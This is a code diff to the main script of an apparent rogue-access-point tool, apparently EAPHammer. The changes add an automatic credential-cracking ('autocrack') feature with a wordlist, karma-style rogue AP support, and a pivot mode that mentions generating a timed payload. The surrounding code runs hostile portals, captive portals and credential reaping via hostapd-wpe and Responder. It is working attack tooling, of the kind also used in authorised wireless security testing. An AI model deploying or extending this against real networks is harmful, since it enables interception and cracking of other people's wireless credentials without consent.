@@ -7,6 +7,7 @@ import time
 
 from core import cert_manager, conf_manager, utils, responder
 from core.servers.redirect_server import RedirectServer
+from core.autocrack import Autocrack
 from argparse import ArgumentParser
 from config import __version__
 
@@ -45,10 +46,16 @@ def hostile_portal():
     global responder
 
     try:
+    
+        # start autocrack if enabled
+        if options['use_autocrack']:
+
+            autocrack = Autocrack.get_instance()
+            autocrack.configure(wordlist=options['wordlist'])
+            autocrack.start()
+
         # prepare environment
-        utils.NetworkManager.stop()
-        utils.WPASupplicant.stop()
-        utils.wlan_clean(options['interface'])
+        utils.nmcli.set_unmanaged(options['interface'])
         utils.set_ipforward(1)
 
         # initialize access point
@@ -57,15 +64,20 @@ def hostile_portal():
                                             ssid=options['essid'],
                                             hw_mode=options['hw_mode'],
                                             bssid=options['bssid'],
-                                            channel=options['channel'])
+                                            channel=options['channel'],
+                                            karma=options['karma'])
         else:
             conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
                                             ssid=options['essid'],
                                             hw_mode=options['hw_mode'],
                                             bssid=options['bssid'],
                                             channel=options['channel'],
-                                            wpa=options['wpa'])
-        utils.Hostapd.hardstart('-s %s ' % config.hostapd_cnf, verbose=False)
+                                            wpa=options['wpa'],
+                                            karma=options['karma'],
+                                            use_autocrack=options['use_autocrack'],
+                                            eaphammer_fifo_path=config.fifo_path)
+
+        utils.Hostapd.hardstart('%s ' % config.hostapd_cnf, verbose=False)
 
         # configure routing 
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
@@ -85,9 +97,16 @@ def hostile_portal():
         rs.start()
 
         # start Responder
-        responder = responder.Responder.get_instance()
-        responder.configure(interface=options['interface'])
-        responder.start()
+        if options['pivot']:
+
+            print '[*] Pivot mode activated. Rogue SMB server disabled.'
+            print '[*] Run payload_generator to generate a timed payload if desired.'
+            conf_manager.responder_cnf.configure(smb=False)
+        else:
+            conf_manager.responder_cnf.configure(smb=True)
+        resp = responder.Responder.get_instance()
+        resp.configure(interface=options['interface'])
+        resp.start()
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -104,13 +123,20 @@ def hostile_portal():
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
-        responder.stop()
+        resp.stop()
         rs.stop()
+        if options['use_autocrack']:
+            autocrack.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
         utils.Iptables.flush()
         utils.Iptables.flush('nat')
+
+
+        # cleanly allow network manager to regain control of interface
+        utils.nmcli.set_managed(options['interface'])
+
 
     except KeyboardInterrupt:
     
@@ -118,23 +144,33 @@ def hostile_portal():
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
         utils.Dnsspoof.kill()
-        responder.stop()
+        resp.stop()
         rs.stop()
+        if options['use_autocrack']:
+            autocrack.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
         utils.Iptables.flush()
         utils.Iptables.flush('nat')
 
+        # cleanly allow network manager to regain control of interface
+        utils.nmcli.set_managed(options['interface'])
+
 def captive_portal():
 
     try:
 
         # prepare environment
-        utils.NetworkManager.stop()
-        utils.WPASupplicant.stop()
-        utils.wlan_clean(options['interface'])
         utils.set_ipforward(1)
+        utils.nmcli.set_unmanaged(options['interface'])
+
+        # start autocrack if enabled
+        if options['use_autocrack']:
+
+            autocrack = Autocrack.get_instance()
+            autocrack.configure(wordlist=options['wordlist'])
+            autocrack.start()
 
         # initialize access point
         if options['auth'] == 'open':
@@ -142,16 +178,20 @@ def captive_portal():
                                             ssid=options['essid'],
                                             hw_mode=options['hw_mode'],
                                             bssid=options['bssid'],
-                                            channel=options['channel'])
+                                            channel=options['channel'],
+                                            karma=options['karma'])
         else:
             conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
                                             ssid=options['essid'],
                                             hw_mode=options['hw_mode'],
                                             bssid=options['bssid'],
                                             channel=options['channel'],
-                                            wpa=options['wpa'])
+                                            wpa=options['wpa'],
+                                            karma=options['karma'],
+                                            use_autocrack=options['use_autocrack'],
+                                            eaphammer_fifo_path=config.fifo_path)
 
-        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf, verbose=False)
+        utils.Hostapd.hardstart('%s' % config.hostapd_cnf, verbose=False)
 
         # configure routing 
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
@@ -183,6 +223,8 @@ def captive_portal():
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
+        if options['use_autocrack']:
+            autocrack.stop()
 
         # stop services
         utils.Httpd.stop()
@@ -192,42 +234,66 @@ def captive_portal():
         utils.Iptables.flush()
         utils.Iptables.flush('nat')
 
+        # cleanly allow network manager to regain control of interface
+        utils.nmcli.set_managed(options['interface'])
+
     except KeyboardInterrupt:
 
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
+        if options['use_autocrack']:
+            autocrack.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
         utils.Iptables.flush()
         utils.Iptables.flush('nat')
 
+        # cleanly allow network manager to regain control of interface
+        utils.nmcli.set_managed(options['interface'])
+
 def reap_creds():
 
     try:
+
+        # start autocrack if enabled
+        if options['use_autocrack']:
+
+            autocrack = Autocrack.get_instance()
+            autocrack.configure(wordlist=options['wordlist'])
+            autocrack.start()
+
         conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
                                         ssid=options['essid'],
                                         hw_mode=options['hw_mode'],
                                         bssid=options['bssid'],
                                         channel=options['channel'],
-                                        wpa=options['wpa'])
+                                        wpa=options['wpa'],
+                                        karma=options['karma'],
+                                        use_autocrack=options['use_autocrack'],
+                                        eaphammer_fifo_path=config.fifo_path)
 
-        utils.NetworkManager.stop()
-        utils.WPASupplicant.stop()
-        utils.wlan_clean(options['interface'])
-        utils.Hostapd.hardstart('-s %s ' % config.hostapd_cnf, verbose=False)
+        utils.nmcli.set_unmanaged(options['interface'])
+        utils.Hostapd.hardstart('%s ' % config.hostapd_cnf, verbose=False)
 
         # pause execution until user quits
         raw_input('press enter to quit...')
 
         utils.Hostapd.kill()
 
+        # cleanly allow network manager to regain control of interface
+        utils.nmcli.set_managed(options['interface'])
+
     except KeyboardInterrupt:
     
         # kill daemons
         utils.Hostapd.kill()
-        
+        if options['use_autocrack']:
+            autocrack.stop()
+
+        # cleanly allow network manager to regain control of interface
+        utils.nmcli.set_managed(options['interface'])
 
 def set_options():
 
@@ -297,6 +363,33 @@ def set_options():
                     action='store_true',
                     help='Force clients to connect to a captive portal')
 
+    parser.add_argument('--pivot',
+                    dest='pivot',
+                    action='store_true',
+                    help='Use this flag to perform an indirect wireless pivot')
+
+    parser.add_argument('--karma',
+                    dest='karma',
+                    action='store_true',
+                    help='Enable karma.')
+
+    parser.add_argument('--remote-autocrack',
+                    dest='remote_autocrack',
+                    metavar='hostname:port',
+                    type=str,
+                    help='Use autocrack n add with remote cracking rig.')
+
+    parser.add_argument('--wordlist',
+                    dest='wordlist',
+                    default=config.default_wordlist,
+                    type=str,
+                    help='Specify the wordlist to use with the autocrack feature.')
+
+    parser.add_argument('--local-autocrack',
+                    dest='local_autocrack',
+                    action='store_true',
+                    help='Use internal autocrack n add feature')
+
     args = parser.parse_args()
 
     options = args.__dict__
@@ -310,6 +403,16 @@ def set_options():
             print
             print 'Please specify a valid PHY interface using the --interface flag'
             sys.exit()
+
+    if options['remote_autocrack'] is not None:
+        print
+        print 'This feature has not been implemented yet.'
+        sys.exit()
+        options['use_autocrack'] = True
+    elif options['local_autocrack']:
+        options['use_autocrack'] = True
+    else: 
+        options['use_autocrack'] = False
 
     return options
 
